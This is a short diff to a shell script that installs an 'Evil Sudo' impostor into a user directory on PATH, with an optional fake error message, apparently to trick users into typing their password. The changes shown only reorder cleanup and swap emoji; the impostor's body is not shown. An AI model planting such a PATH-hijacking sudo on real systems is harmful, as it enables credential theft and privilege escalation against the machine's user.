@@ -32,18 +32,13 @@ spawn_evil_sudo() {
 
     chmod +x $USER_DIRECTORY_IN_PATH/sudo
 
-    echo 😤
+    echo 😈
 }
 
 clean_up() {
     if test -f $USER_DIRECTORY_IN_PATH/sudo && grep -q "Evil Sudo" $USER_DIRECTORY_IN_PATH/sudo; then
         rm $USER_DIRECTORY_IN_PATH/sudo
-        echo "🧹"
-        exit
     fi
-
-    echo Nothing to clean...
-    exit
 }
 
 set_user_directory_in_path
@@ -52,10 +47,13 @@ exit_if_no_user_directory_in_path
 # Clean up if asked
 if [ "$1" == "--clean" ] || [ "$1" == "-c" ]; then
     clean_up
+    echo "🧹"
+    exit
 fi
 
 if [ ! -z "$1" ]; then
     FAKE_ERROR_MESSAGE=$1
 fi
 
+clean_up
 spawn_evil_sudo
